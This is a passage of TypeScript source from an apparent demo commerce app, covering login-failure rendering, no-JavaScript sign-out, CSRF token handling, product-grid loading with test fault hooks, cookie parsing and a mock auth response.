    renderFailurePage: (failure) => {
      const failureState =
        failure.error.code === 'INVALID_CREDENTIALS'
          ? ({ failure: { code: 'INVALID_CREDENTIALS' } } as const)
          : {};

      return `<!doctype html><html><body>${renderCommerceLoginForm(request, {
        ...failureState,
        ...(next === undefined ? {} : { next }),
      })}</body></html>`;
    },
    request,
  });
}

export function submitCommerceSignOutNoJs(request: CommerceAuthRequest) {
  return renderMutationEndpointResponse(commerceSignOut, {
    csrf: commerceAuthCsrf,
    headers: {},
    rawInput: { csrf: csrfToken(request, commerceAuthCsrf) },
    redirectTo: (result) => result.value.redirectTo,
    request,
    sessionProvider: commerceSessionProvider,
  });
}

export function commerceCsrfInput(rawInput: unknown, request: CommerceRequest): unknown {
  return appendCommerceCsrf(rawInput, request);
}

function appendCommerceCsrf(rawInput: unknown, request: CommerceRequest): unknown {
  if (typeof rawInput !== 'object' || rawInput === null) return rawInput;
  if ('csrf' in rawInput) return rawInput;
  if (!request.session?.id) return rawInput;
  return {
    ...rawInput,
    csrf: csrfToken(request, commerceCsrf),
  };
}

async function loadProductGridForRequest(
  db: CommerceDb,
  input?: ProductGridInput,
  request?: CommerceRequest,
): Promise<ProductGridResult> {
  const productGridError = request?.renderFaults?.productGrid?.();
  if (productGridError) throw productGridError;

  return loadProductGrid(db, input);
}

async function renderAddToCartFailureFragment(
  db: CommerceDb,
  rawInput: unknown,
  failure: MutationFail,
  request: CommerceRequest,
): Promise<string> {
  const productId = productIdFromRawInput(rawInput);
  const product = productId ? await loadProductForFailure(db, productId) : undefined;

  if (!product) return renderAddToCartMutationFailureError(failure);

  return renderAddToCartMutationFailureForm(product, failure, request);
}

function productIdFromRawInput(rawInput: unknown): string | undefined {
  if (typeof rawInput !== 'object' || rawInput === null || !('productId' in rawInput)) {
    return undefined;
  }
  const productId = rawInput.productId;
  return typeof productId === 'string' ? productId : undefined;
}

function nextFromRawInput(rawInput: unknown): string | undefined {
  if (typeof rawInput !== 'object' || rawInput === null || !('next' in rawInput)) {
    return undefined;
  }
  const next = rawInput.next;
  return typeof next === 'string' ? next : undefined;
}

function readCookie(headers: Headers, name: string): string | undefined {
  const cookie = headers.get('cookie');
  if (!cookie) return undefined;

  for (const part of cookie.split(';')) {
    const [rawName, ...rawValue] = part.trim().split('=');
    if (rawName === name) return rawValue.join('=');
  }

  return undefined;
}

function commerceAuthResponse(cookies: readonly string[], status = 204): BetterAuthResponseLike {
  const headers = new Headers();

  Object.defineProperty(headers, 'getSetCookie', {
    value: () => [...cookies],
  });

  return { headers, status };
}

// A fresh, unmodified database has an empty cart (count 0); the demo graph is a
// module-load static, so it uses that starter value rather than awaiting a read.
export const commerceGraph = createCommerceGraph({ count: 0 }, commerceTouchGraph);
